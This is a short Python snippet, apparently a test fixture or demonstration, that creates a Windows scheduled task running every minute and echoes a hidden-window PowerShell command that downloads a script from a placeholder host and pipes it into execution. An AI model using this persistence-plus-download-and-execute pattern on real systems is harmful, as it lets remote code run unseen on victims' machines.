import subprocess
subprocess.run(["schtasks", "/Create", "/TN", "Status", "/SC", "MINUTE", "/TR", "powershell -Command Write-Output status"])
subprocess.run(["echo", "powershell -WindowStyle Hidden -Command iwr https://example.invalid/update.ps1 | iex"])
